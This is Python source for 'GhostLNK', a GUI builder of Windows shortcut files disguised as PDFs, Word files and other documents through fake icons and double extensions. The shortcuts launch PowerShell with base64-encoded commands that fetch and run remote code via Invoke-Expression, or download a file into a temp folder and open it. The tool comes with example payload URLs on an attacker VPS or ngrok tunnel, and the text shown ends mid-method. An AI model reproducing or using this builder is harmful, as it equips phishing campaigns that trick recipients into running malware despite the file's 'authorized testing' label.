#!/usr/bin/env python3
"""
GhostLNK - Professional LNK Generator with Debug Mode
Coded for educational and authorized testing purposes only
"""

import os
import sys
import base64
import json
import subprocess
import re
import tempfile
import time
from datetime import datetime
from pathlib import Path

# Try to import required libraries
try:
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard
except ImportError:
    print("[-] PyQt6 not installed. Installing...")
    os.system("pip install PyQt6")
    from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                 QHBoxLayout, QLabel, QLineEdit, QPushButton, 
                                 QTextEdit, QComboBox, QGroupBox, QGridLayout,
                                 QMessageBox, QFileDialog, QSpinBox, QCheckBox,
                                 QTabWidget, QListWidget, QListWidgetItem, QMenu,
                                 QSplitter, QFrame, QProgressBar, QToolTip)
    from PyQt6.QtCore import Qt, QTimer, QMimeData, QThread, pyqtSignal
    from PyQt6.QtGui import QIcon, QFont, QPalette, QColor, QAction, QClipboard

try:
    import pylnk3
except ImportError:
    print("[-] pylnk3 not installed. Installing...")
    os.system("pip install pylnk3")
    import pylnk3

# Configuration file
CONFIG_FILE = "ghostlnk_config.json"

class URLExamples:
    """Collection of URL examples for different scenarios"""
    
    DROPBOX_EXAMPLE = "https://www.dropbox.com/scl/fi/6z4ogo404tOtr/file_name?rlkey=rl63zpok5gork304fw23&dl=1"
    
    EXAMPLES = {
        "Dropbox PDF": {
            "url": DROPBOX_EXAMPLE,
            "description": "Dropbox shared file - Must end with dl=1 for direct download",
            "type": "document",
            "note": "⚠️ Dropbox URLs need '&dl=1' or '?dl=1' at the end for direct download"
        },
        "Your VPS - File": {
            "url": "http://YOUR-VPS-IP:8000/payload.exe",
            "description": "Host your own file on a VPS using Python HTTP server",
            "type": "executable",
            "note": "Start server: python3 -m http.server 8000"
        },
        "Your VPS - Script": {
            "url": "http://YOUR-VPS-IP:8000/script.ps1",
            "description": "Host PowerShell scripts on your VPS",
            "type": "script",
            "note": "Make sure script is accessible via wget"
        },
        "GitHub Raw": {
            "url": "https://raw.githubusercontent.com/username/repo/branch/file.pdf",
            "description": "Raw GitHub files - Good for testing",
            "type": "document",
            "note": "Use raw.githubusercontent.com, not regular github.com"
        },
        "Direct File Server": {
            "url": "https://example.com/files/document.pdf",
            "description": "Direct link to file on any server",
            "type": "document",
            "note": "Ensure the server allows direct downloads"
        },
        "NGrok Tunnel": {
            "url": "https://your-ngrok-id.ngrok.io/payload.exe",
            "description": "Expose local server via ngrok",
            "type": "executable",
            "note": "Use ngrok http 8000 to expose local server"
        },
        "File sharing service": {
            "url": "https://file.io/abc123",
            "description": "Temporary file hosting",
            "type": "document",
            "note": "Files expire after download"
        }
    }
    
    @staticmethod
    def get_all_examples():
        return URLExamples.EXAMPLES
    
    @staticmethod
    def get_dropbox_note():
        return "📌 Dropbox Tip: Always add '&dl=1' to the end of shared links to force direct download"


class PowerShellConverter:
    """Convert URLs to PowerShell -E format"""
    
    @staticmethod
    def url_to_powershell_command(url, use_invoke=True):
        """Convert URL to PowerShell command"""
        if use_invoke:
            ps_command = f"Invoke-Expression (wget -useb '{url}')"
        else:
            ps_command = f"Invoke-Expression (Invoke-WebRequest -Uri '{url}')"
        return ps_command
    
    @staticmethod
    def validate_dropbox_url(url):
        """Check if Dropbox URL has correct parameters"""
        if 'dropbox.com' in url.lower():
            if 'dl=1' not in url:
                return False, "Dropbox URL missing 'dl=1' parameter. Add '&dl=1' or '?dl=1' to the end."
            return True, "Valid Dropbox URL"
        return True, "Not a Dropbox URL"
    
    @staticmethod
    def url_to_powershell_with_debug(url, pause=True):
        """
        Create a PowerShell command with debug output
        """
        # Validate Dropbox URLs
        is_dropbox, dropbox_msg = PowerShellConverter.validate_dropbox_url(url)
        dropbox_warning = ""
        if not is_dropbox:
            dropbox_warning = f"""
# ⚠️ DROPBOX WARNING: {dropbox_msg}
# The download may fail without the correct parameter!
"""
        
        pause_cmd = "pause" if pause else "Start-Sleep -Seconds 5"
        
        ps_command = f'''
# GhostLNK Debug Mode - Verbose Output
{dropbox_warning}
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "👻 GhostLNK Debug Mode - Execution Started" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[+] Target URL: {url}" -ForegroundColor Yellow

# Check if it's a Dropbox URL
if ("{url}" -like "*dropbox.com*") {{
    Write-Host "[!] Dropbox URL detected - Checking parameters..." -ForegroundColor Yellow
    if ("{url}" -notlike "*dl=1*") {{
        Write-Host "[⚠️] WARNING: Dropbox URL missing 'dl=1' parameter!" -ForegroundColor Red
        Write-Host "[⚠️] Add '&dl=1' to the end of the URL for direct download" -ForegroundColor Red
    }} else {{
        Write-Host "[✓] Dropbox URL has correct 'dl=1' parameter" -ForegroundColor Green
    }}
}}

# Test URL accessibility
try {{
    Write-Host "[+] Testing URL connection..." -ForegroundColor Yellow
    $testRequest = [System.Net.WebRequest]::Create("{url}")
    $testRequest.Method = "HEAD"
    $testRequest.Timeout = 5000
    $testResponse = $testRequest.GetResponse()
    Write-Host "[✓] URL is accessible! Status: $($testResponse.StatusCode)" -ForegroundColor Green
    Write-Host "[+] Content-Type: $($testResponse.ContentType)" -ForegroundColor Green
    Write-Host "[+] Content-Length: $($testResponse.ContentLength) bytes" -ForegroundColor Green
    $testResponse.Close()
}}
catch {{
    Write-Host "[✗] URL test failed: $_" -ForegroundColor Red
    Write-Host "[✗] Check if URL is correct and accessible" -ForegroundColor Red
}}

Write-Host ""
Write-Host "[+] Creating WebClient object..." -ForegroundColor Yellow
$wc = New-Object System.Net.WebClient

# Setup download
$tempFile = [System.IO.Path]::GetTempFileName()
$outputFile = $tempFile + ".tmp"
Write-Host "[+] Temporary file: $outputFile" -ForegroundColor Yellow

try {{
    Write-Host "[+] Starting download at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Yellow
    $downloadStart = Get-Date
    
    # Download with progress
    $wc.DownloadFile("{url}", $outputFile)
    
    $downloadEnd = Get-Date
    $duration = $downloadEnd - $downloadStart
    $fileSize = (Get-Item $outputFile).Length
    
    Write-Host "[✓] Download completed at: $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor Green
    Write-Host "[✓] Download duration: $($duration.TotalSeconds) seconds" -ForegroundColor Green
    Write-Host "[✓] File size: $fileSize bytes ($([math]::Round($fileSize/1MB,2)) MB)" -ForegroundColor Green
    
    # Check if file was downloaded successfully
    if (Test-Path $outputFile) {{
        Write-Host "[✓] File saved successfully to: $outputFile" -ForegroundColor Green
        
        # Show file information
        $fileInfo = Get-Item $outputFile
        Write-Host "[+] File created: $($fileInfo.CreationTime)" -ForegroundColor Yellow
        Write-Host "[+] File modified: $($fileInfo.LastWriteTime)" -ForegroundColor Yellow
        
        # Try to determine file type
        $fileHeader = Get-Content $outputFile -Encoding Byte -TotalCount 4
        $headerHex = ($fileHeader | ForEach-Object {{ $_.ToString("X2") }}) -join ""
        Write-Host "[+] File header (hex): $headerHex" -ForegroundColor Yellow
        
        # Identify file type by header
        if ($headerHex -like "25504446") {{
            Write-Host "[✓] File appears to be a PDF document" -ForegroundColor Green
        }} elseif ($headerHex -like "4D5A*") {{
            Write-Host "[✓] File appears to be an executable (PE file)" -ForegroundColor Green
        }} elseif ($headerHex -like "504B0304") {{
            Write-Host "[✓] File appears to be a ZIP archive" -ForegroundColor Green
        }} elseif ($headerHex -like "FFD8FF*") {{
            Write-Host "[✓] File appears to be a JPEG image" -ForegroundColor Green
        }}
        
        # Open the file
        Write-Host "[+] Opening file with default application..." -ForegroundColor Yellow
        Invoke-Item $outputFile
        Write-Host "[✓] File opened successfully!" -ForegroundColor Green
    }}
    else {{
        Write-Host "[✗] File was not created!" -ForegroundColor Red
    }}
}}
catch {{
    Write-Host "[✗] Download failed: $_" -ForegroundColor Red
    Write-Host "[✗] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
    
    # Specific error help
    if ($_.Exception.Message -like "*404*") {{
        Write-Host "[💡] TIP: 404 error means file not found - Check the URL" -ForegroundColor Cyan
    }} elseif ($_.Exception.Message -like "*403*") {{
        Write-Host "[💡] TIP: 403 error means forbidden - Server may block automated downloads" -ForegroundColor Cyan
    }} elseif ($_.Exception.Message -like "*dropbox*") {{
        Write-Host "[💡] TIP: For Dropbox, ensure URL ends with '?dl=1' or '&dl=1'" -ForegroundColor Cyan
    }}
}}
finally {{
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "👻 GhostLNK Debug Mode - Execution Complete" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
}}

Write-Host ""
Write-Host "Press any key to exit this window..." -ForegroundColor White
{pause_cmd}
'''
        return ps_command.strip()
    
    @staticmethod
    def encode_powershell_command(ps_command):
        """Encode PowerShell command to base64"""
        ps_command_utf16 = ps_command.encode('utf-16le')
        encoded = base64.b64encode(ps_command_utf16).decode('utf-8')
        return encoded
    
    @staticmethod
    def create_full_powershell_argument(ps_command):
        """Create full -E argument"""
        encoded = PowerShellConverter.encode_powershell_command(ps_command)
        return f"-E {encoded}"
    
    @staticmethod
    def decode_powershell_argument(encoded_arg):
        """Decode PowerShell -E argument"""
        if encoded_arg.startswith('-E '):
            encoded_arg = encoded_arg[3:]
        elif encoded_arg.startswith('-e '):
            encoded_arg = encoded_arg[3:]
        
        try:
            decoded_bytes = base64.b64decode(encoded_arg)
            decoded = decoded_bytes.decode('utf-16le')
            return decoded
        except:
            try:
                decoded = decoded_bytes.decode('utf-8')
                return decoded
            except:
                return None


class LNKEngine:
    """Core LNK generation engine"""
    
    @staticmethod
    def create_lnk(output_filename, target_path, arguments, icon_path, icon_index, description, working_dir=None):
        """Create a Windows LNK file"""
        # Parse target path
        target_split = target_path.split('\\')
        target_file = target_split[-1]
        target_drive = target_split[0]
        target_directory = working_dir or '\\'.join(target_split[:-1])
        
        # Create LNK object
        lnk = pylnk3.create(output_filename)
        
        # Set basic information
        lnk.specify_local_location(target_path)
        
        # Configure link info
        lnk._link_info.size_local_volume_table = 0
        lnk._link_info.volume_label = ""
        lnk._link_info.drive_serial = 0
        lnk._link_info.local = True
        lnk._link_info.local_base_path = target_path
        
        # Set window mode and arguments
        lnk.window_mode = 'Normal'
        if arguments:
            lnk.arguments = arguments
            
        # Set icon
        lnk.icon = icon_path
        lnk.icon_index = icon_index
            
        # Set working directory
        lnk.working_dir = target_directory
        
        # Set description
        if description:
            lnk.description = description
            
        # Build the shell item ID list
        def build_entry(name, is_dir):
            entry = pylnk3.PathSegmentEntry()
            entry.type = pylnk3.TYPE_FOLDER if is_dir else pylnk3.TYPE_FILE
            entry.file_size = 0
            
            n = datetime.now()
            entry.modified = n
            entry.created = n
            entry.accessed = n
            
            entry.short_name = name
            entry.full_name = name
            
            return entry
        
        # Create the path hierarchy
        elements = [
            pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
            pylnk3.DriveEntry(target_drive)
        ]
        
        # Add each directory in the path
        for level in target_split[1:-1]:
            if level:
                entry = build_entry(level, is_dir=True)
                elements.append(entry)
        
        # Add the target file
        entry = build_entry(target_file, is_dir=False)
        elements.append(entry)
        
        # Set the shell item ID list
        lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
        lnk.shell_item_id_list.items = elements
        
        # Write the LNK file
        with open(output_filename, 'wb') as f:
            lnk.write(f)
        
        return True


class GhostLNKGUI(QMainWindow):
    """Main GUI Window - GhostLNK"""
    
    # Icon database
    ICON_DATABASE = {
        "PDF Document": (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe", 11, ".pdf"),
        "Word Document": (r"C:\Windows\System32\SHELL32.dll", 1, ".doc"),
        "Excel Spreadsheet": (r"C:\Windows\System32\SHELL32.dll", 3, ".xls"),
        "Text Document": (r"C:\Windows\System32\notepad.exe", 0, ".txt"),
        "Folder": (r"C:\Windows\System32\SHELL32.dll", 4, ""),
        "JPG Image": (r"C:\Windows\System32\imageres.dll", 67, ".jpg"),
        "ZIP Archive": (r"C:\Windows\System32\imageres.dll", 165, ".zip"),
        "MP3 Audio": (r"C:\Windows\System32\imageres.dll", 125, ".mp3"),
        "Video File": (r"C:\Windows\System32\SHELL32.dll", 118, ".mp4"),
    }
    
    def __init__(self):
        super().__init__()
        self.recent_urls = []
        self.recent_conversions = []
        self.load_config()
        self.init_ui()
        
    def load_config(self):
        """Load configuration from file"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.recent_urls = config.get('recent_urls', [])
                    self.recent_conversions = config.get('recent_conversions', [])
            except:
                self.recent_urls = []
                self.recent_conversions = []
    
    def save_config(self):
        """Save configuration to file"""
        config = {
            'recent_urls': self.recent_urls[-20:],
            'recent_conversions': self.recent_conversions[-20:]
        }
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f)
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("👻 GhostLNK v1.0 - URL to PowerShell -E Converter with Examples")
        self.setGeometry(100, 100, 1500, 1000)
        
        # Set dark theme with ghostly accents
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1a1a2e;
            }
            QLabel {
                color: #e0e0e0;
                font-size: 12px;
            }
            QLineEdit, QTextEdit, QComboBox, QSpinBox {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
                border-radius: 3px;
                padding: 5px;
                font-size: 12px;
            }
            QPushButton {
                background-color: #0f3460;
                color: white;
                border: none;
                border-radius: 3px;
                padding: 8px;
                font-size: 12px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #1a4b8c;
            }
            QPushButton:pressed {
                background-color: #0a2647;
            }
            QGroupBox {
                color: #e0e0e0;
                border: 2px solid #0f3460;
                border-radius: 5px;
                margin-top: 10px;
                font-size: 13px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
            }
            QTabWidget::pane {
                border: 1px solid #0f3460;
                background-color: #1a1a2e;
            }
            QTabBar::tab {
                background-color: #16213e;
                color: #e0e0e0;
                padding: 8px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #0f3460;
            }
            QListWidget {
                background-color: #16213e;
                color: #e0e0e0;
                border: 1px solid #0f3460;
            }
            QCheckBox {
                color: #e0e0e0;
            }
            QProgressBar {
                border: 1px solid #0f3460;
                background-color: #16213e;
                color: white;
                text-align: center;
            }
            QProgressBar::chunk {
                background-color: #4CAF50;
                width: 10px;
            }
        """)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # Title with ghost effect
        title_label = QLabel("👻 GhostLNK - Professional URL to PowerShell LNK Converter 👻")
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_font = QFont("Arial", 20, QFont.Weight.Bold)
        title_label.setFont(title_font)
        title_label.setStyleSheet("color: #a8a8ff; padding: 10px;")
        main_layout.addWidget(title_label)
        
        # Subtitle with Dropbox note
        subtitle = QLabel("Convert any URL to PowerShell -E payload | 📌 Dropbox: Always add '&dl=1' for direct download")
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #ffaa00; padding-bottom: 10px; font-weight: bold;")
        main_layout.addWidget(subtitle)
        
        # Create horizontal splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel - Converter
        left_panel = self.create_converter_panel()
        splitter.addWidget(left_panel)
        
        # Right panel - LNK Generator
        right_panel = self.create_lnk_panel()
        splitter.addWidget(right_panel)
        
        splitter.setSizes([700, 800])
        
        # Console output
        console_group = QGroupBox("👻 Ghost Console - Debug Output")
        console_layout = QVBoxLayout()
        
        # Console toolbar
        console_toolbar = QHBoxLayout()
        clear_console_btn = QPushButton("Clear Console")
        clear_console_btn.clicked.connect(lambda: self.console.clear())
        console_toolbar.addWidget(clear_console_btn)
        
        save_console_btn = QPushButton("Save Console Log")
        save_console_btn.clicked.connect(self.save_console_log)
        console_toolbar.addWidget(save_console_btn)
        
        console_toolbar.addStretch()
        console_layout.addLayout(console_toolbar)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setMaximumHeight(180)
        self.console.setStyleSheet("""
            background-color: #0a0a1a; 
            color: #9fdf9f; 
            font-family: 'Courier New', monospace;
            border: 1px solid #0f3460;
        """)
        console_layout.addWidget(self.console)
        console_group.setLayout(console_layout)
        main_layout.addWidget(console_group)
        
        # Status bar
        self.statusBar().showMessage("👻 GhostLNK is ready - Select an example URL below or enter your own")
        self.statusBar().setStyleSheet("color: #a8a8ff;")
        
        # Create menus
        self.create_menu()
        
        # Welcome message
        self.log("👻 GhostLNK v1.0 initialized")
        self.log("[*] Check the 'URL Examples' section below for sample payload URLs")
        self.log("[*] Dropbox Tip: Always use '&dl=1' at the end of shared links")
        self.log("[*] Ready to convert URLs to PowerShell -E payloads")
    
    def create_converter_panel(self):
        """Create the converter panel with URL examples"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Header
        header = QLabel("🔮 URL to PowerShell -E Converter")
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #a8a8ff; padding: 5px;")
        layout.addWidget(header)
        
        # URL Examples Section - NEW
        examples_group = QGroupBox("📋 URL Examples (Click to load)")
        examples_layout = QVBoxLayout()
        
        # Dropbox example (highlighted)
        dropbox_frame = QFrame()
        dropbox_frame.setStyleSheet("background-color: #2a1a3a; border-radius: 5px; padding: 5px;")
        dropbox_layout = QHBoxLayout(dropbox_frame)
        
        dropbox_label = QLabel("📌 Dropbox PDF (with dl=1):")
        dropbox_label.setStyleSheet("color: #ffaa00; font-weight: bold;")
        dropbox_layout.addWidget(dropbox_label)
        
        dropbox_btn = QPushButton("Load Dropbox Example")
        dropbox_btn.setStyleSheet("background-color: #8B5F8B;")
        dropbox_btn.clicked.connect(self.load_dropbox_example)
        dropbox_layout.addWidget(dropbox_btn)
        
        dropbox_note = QLabel("⚠️ Must end with dl=1")
        dropbox_note.setStyleSheet("color: #ff6666;")
        dropbox_layout.addWidget(dropbox_note)
        
        examples_layout.addWidget(dropbox_frame)
        
        # Other examples grid
        examples_grid = QGridLayout()
        
        # Row 1: VPS examples
        vps_file_btn = QPushButton("Your VPS - File")
        vps_file_btn.clicked.connect(lambda: self.load_example_url("http://YOUR-VPS-IP:8000/payload.exe"))
        vps_file_btn.setToolTip("Host files on your own VPS using Python HTTP server")
        examples_grid.addWidget(vps_file_btn, 0, 0)
        
        vps_script_btn = QPushButton("Your VPS - Script")
        vps_script_btn.clicked.connect(lambda: self.load_example_url("http://YOUR-VPS-IP:8000/script.ps1"))
        vps_script_btn.setToolTip("Host PowerShell scripts on your VPS")
        examples_grid.addWidget(vps_script_btn, 0, 1)
        
        # Row 2: Public services
        github_btn = QPushButton("GitHub Raw")
        github_btn.clicked.connect(lambda: self.load_example_url("https://raw.githubusercontent.com/username/repo/branch/file.pdf"))
        github_btn.setToolTip("Use raw.githubusercontent.com for direct downloads")
        examples_grid.addWidget(github_btn, 1, 0)
        
        ngrok_btn = QPushButton("NGrok Tunnel")
        ngrok_btn.clicked.connect(lambda: self.load_example_url("https://your-ngrok-id.ngrok.io/payload.exe"))
        ngrok_btn.setToolTip("Expose local server via ngrok")
        examples_grid.addWidget(ngrok_btn, 1, 1)
        
        # Row 3: More examples
        direct_btn = QPushButton("Direct File Server")
        direct_btn.clicked.connect(lambda: self.load_example_url("https://example.com/files/document.pdf"))
        examples_grid.addWidget(direct_btn, 2, 0)
        
        fileio_btn = QPushButton("File.io Service")
        fileio_btn.clicked.connect(lambda: self.load_example_url("https://file.io/abc123"))
        examples_grid.addWidget(fileio_btn, 2, 1)
        
        examples_layout.addLayout(examples_grid)
        
        # Tips section
        tips_label = QLabel(
            "💡 Tips:\n"
            "• Dropbox: Always add '&dl=1' to the end of shared links\n"
            "• VPS: Run 'python3 -m http.server 8000' to host files\n"
            "• GitHub: Use raw.githubusercontent.com, not regular github.com\n"
            "• Test URLs with 'wget URL' or 'curl -I URL' first"
        )
        tips_label.setWordWrap(True)
        tips_label.setStyleSheet("color: #8888aa; font-size: 11px; padding: 5px;")
        examples_layout.addWidget(tips_label)
        
        examples_group.setLayout(examples_layout)
        layout.addWidget(examples_group)
        
        # URL Input
        url_group = QGroupBox("Step 1: Enter Your URL (or click an example above)")
        url_layout = QVBoxLayout()
        
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://your-server.com/file.pdf")
        url_layout.addWidget(self.url_input)
        
        # Dropbox validator indicator
        self.dropbox_indicator = QLabel("")
        self.dropbox_indicator.setStyleSheet("color: #ffaa00; font-size: 11px;")
        url_layout.addWidget(self.dropbox_indicator)
        
        # Connect URL input change to validate Dropbox
        self.url_input.textChanged.connect(self.validate_dropbox_url)
        
        url_group.setLayout(url_layout)
        layout.addWidget(url_group)
        
        # Debug Options
        debug_group = QGroupBox("Step 2: Debug & Execution Options")
        debug_layout = QVBoxLayout()
        
        debug_check_layout = QHBoxLayout()
        self.debug_mode_cb = QCheckBox("👁️ Enable Debug Mode (Verbose Output with troubleshooting)")
        self.debug_mode_cb.setChecked(False)
        self.debug_mode_cb.setStyleSheet("color: #ffaa00;")
        debug_check_layout.addWidget(self.debug_mode_cb)
        
        self.pause_after_cb = QCheckBox("⏸️ Pause after execution (Press any key to exit)")
        self.pause_after_cb.setChecked(True)
        debug_check_layout.addWidget(self.pause_after_cb)
        
        debug_layout.addLayout(debug_check_layout)
        
        debug_info = QLabel(
            "Debug mode shows: URL testing, download progress, file details, error messages\n"
            "Perfect for troubleshooting Dropbox links and connection issues"
        )
        debug_info.setWordWrap(True)
        debug_info.setStyleSheet("color: #8888aa; font-size: 11px; padding: 5px;")
        debug_layout.addWidget(debug_info)
        
        debug_group.setLayout(debug_layout)
        layout.addWidget(debug_group)
        
        # Conversion buttons
        convert_group = QGroupBox("Step 3: Generate Payload")
        convert_layout = QVBoxLayout()
        
        # Button row 1
        btn_row1 = QHBoxLayout()
        
        self.show_cmd_btn = QPushButton("1️⃣ Show PowerShell Command")
        self.show_cmd_btn.clicked.connect(self.show_powershell_command)
        btn_row1.addWidget(self.show_cmd_btn)
        
        self.encode_btn = QPushButton("2️⃣ Encode to Base64")
        self.encode_btn.setStyleSheet("background-color: #d35400;")
        self.encode_btn.clicked.connect(self.encode_url_to_powershell)
        btn_row1.addWidget(self.encode_btn)
        
        convert_layout.addLayout(btn_row1)
        
        # Button row 2
        btn_row2 = QHBoxLayout()
        
        self.copy_arg_btn = QPushButton("3️⃣ Copy -E Argument")
        self.copy_arg_btn.clicked.connect(self.copy_full_argument)
        btn_row2.addWidget(self.copy_arg_btn)
        
        self.use_lnk_btn = QPushButton("🚀 Use in LNK Generator")
        self.use_lnk_btn.setStyleSheet("background-color: #27ae60;")
        self.use_lnk_btn.clicked.connect(self.use_converted_in_lnk)
        btn_row2.addWidget(self.use_lnk_btn)
        
        convert_layout.addLayout(btn_row2)
        
        convert_group.setLayout(convert_layout)
        layout.addWidget(convert_group)
        
        # Results display
        results_group = QGroupBox("Step 4: Results")
        results_layout = QVBoxLayout()
        
        # PowerShell command
        results_layout.addWidget(QLabel("PowerShell Command:"))
        self.ps_command_display = QTextEdit()
        self.ps_command_display.setMaximumHeight(70)
        self.ps_command_display.setStyleSheet("background-color: #16213e; color: #88ff88;")
        results_layout.addWidget(self.ps_command_display)
        
        # Base64 encoded
        results_layout.addWidget(QLabel("Base64 Encoded:"))
        self.base64_display = QTextEdit()
        self.base64_display.setMaximumHeight(50)
        self.base64_display.setStyleSheet("background-color: #16213e; color: #ffaa00;")
        results_layout.addWidget(self.base64_display)
        
        # Full argument
        results_layout.addWidget(QLabel("Full -E Argument (copy this):"))
        self.full_arg_display = QTextEdit()
        self.full_arg_display.setMaximumHeight(50)
        self.full_arg_display.setStyleSheet("background-color: #16213e; color: #ff8888; font-weight: bold;")
        results_layout.addWidget(self.full_arg_display)
        
        # Copy button
        copy_btn = QPushButton("📋 Copy Full Argument to Clipboard")
        copy_btn.clicked.connect(self.copy_full_argument)
        results_layout.addWidget(copy_btn)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        # Decode section
        decode_group = QGroupBox("Decode Existing -E Argument")
        decode_layout = QVBoxLayout()
        
        self.decode_input = QTextEdit()
        self.decode_input.setMaximumHeight(50)
        self.decode_input.setPlaceholderText("Paste existing -E argument here to decode...")
        decode_layout.addWidget(self.decode_input)
        
        decode_btn = QPushButton("🔍 Decode")
        decode_btn.clicked.connect(self.decode_existing)
        decode_layout.addWidget(decode_btn)
        
        self.decode_output = QTextEdit()
        self.decode_output.setReadOnly(True)
        self.decode_output.setMaximumHeight(70)
        self.decode_output.setStyleSheet("background-color: #16213e;")
        decode_layout.addWidget(self.decode_output)
        
        decode_group.setLayout(decode_layout)
        layout.addWidget(decode_group)
        
        # Recent conversions
        recent_group = QGroupBox("Recent Conversions")
        recent_layout = QVBoxLayout()
        
        self.recent_list = QListWidget()
        self.recent_list.itemDoubleClicked.connect(self.use_recent_conversion)
        recent_layout.addWidget(self.recent_list)
        
        clear_btn = QPushButton("Clear Recent")
        clear_btn.clicked.connect(self.clear_recent)
        recent_layout.addWidget(clear_btn)
        
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        self.update_recent_list()
        
        return panel
    
    def create_lnk_panel(self):
        """Create the LNK generator panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Header
        header = QLabel("📁 LNK Generator")
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #a8a8ff; padding: 5px;")
        layout.addWidget(header)
        
        # Quick import
        quick_group = QGroupBox("Quick Import from Converter")
        quick_layout = QHBoxLayout()
        
        self.quick_arg_input = QLineEdit()
        self.quick_arg_input.setPlaceholderText("Paste -E argument here...")
        quick_layout.addWidget(self.quick_arg_input)
        
        import_btn = QPushButton("Import")
        import_btn.clicked.connect(self.import_from_converter)
        quick_layout.addWidget(import_btn)
        
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        # Payload preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        
        preview_layout.addWidget(QLabel("Target: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
        self.current_arg_label = QLabel("Arguments: (not set)")
        self.current_arg_label.setWordWrap(True)
        self.current_arg_label.setStyleSheet("color: #ffaa00; background-color: #16213e; padding: 5px; border-radius: 3px;")
        preview_layout.addWidget(self.current_arg_label)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Icon selection
        icon_group = QGroupBox("Icon Selection")
        icon_layout = QVBoxLayout()
        
        self.icon_combo = QComboBox()
        self.icon_combo.addItems(self.ICON_DATABASE.keys())
        self.icon_combo.setCurrentText("PDF Document")
        icon_layout.addWidget(self.icon_combo)
        
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)
        
        # Filename settings
        filename_group = QGroupBox("Output Filename")
        filename_layout = QGridLayout()
        
        filename_layout.addWidget(QLabel("Base name:"), 0, 0)
        self.filename_base = QLineEdit()
        self.filename_base.setPlaceholderText("Document")
        self.filename_base.setText("Quarterly_Report")
        filename_layout.addWidget(self.filename_base, 0, 1)
        
        filename_layout.addWidget(QLabel("Extension:"), 1, 0)
        self.filename_ext = QComboBox()
        self.filename_ext.addItems([".pdf", ".doc", ".xls", ".txt", ".jpg", ".zip", ".mp3", ".mp4"])
        self.filename_ext.setCurrentText(".pdf")
        filename_layout.addWidget(self.filename_ext, 1, 1)
        
        filename_layout.addWidget(QLabel("Add .lnk:"), 2, 0)
        self.add_lnk_cb = QCheckBox()
        self.add_lnk_cb.setChecked(True)
        filename_layout.addWidget(self.add_lnk_cb, 2, 1)
        
        filename_group.setLayout(filename_layout)
        layout.addWidget(filename_group)
        
        # Description settings
        desc_group = QGroupBox("File Description")
        desc_layout = QVBoxLayout()
        
        self.description_input = QTextEdit()
        self.description_input.setMaximumHeight(80)
        desc_layout.addWidget(self.description_input)
        
        gen_desc_btn = QPushButton("Generate Realistic Description")
        gen_desc_btn.clicked.connect(self.generate_description)
        desc_layout.addWidget(gen_desc_btn)
        
        desc_group.setLayout(desc_layout)
        layout.addWidget(desc_group)
        
        # Generate button
        self.generate_btn = QPushButton("👻 GENERATE GHOST LNK 👻")
        self.generate_btn.setMinimumHeight(60)
        self.generate_btn.setStyleSheet("""
            QPushButton {
                background-color: #6a1f7a;
                font-size: 18px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #8a2be2;
            }
        """)
        self.generate_btn.clicked.connect(self.generate_lnk)
        layout.addWidget(self.generate_btn)
        
        layout.addStretch()
        return panel
    
    def create_menu(self):
        """Create menu bar"""
        menubar = self.menuBar()
        menubar.setStyleSheet("color: #e0e0e0; background-color: #16213e;")
        
        # File menu
        file_menu = menubar.addMenu("File")
        
        save_action = QAction("Save Configuration", self)
        save_action.triggered.connect(self.save_config)
        file_menu.addAction(save_action)
        
        load_action = QAction("Load Configuration", self)
        load_action.triggered.connect(self.load_config_dialog)
        file_menu.addAction(load_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
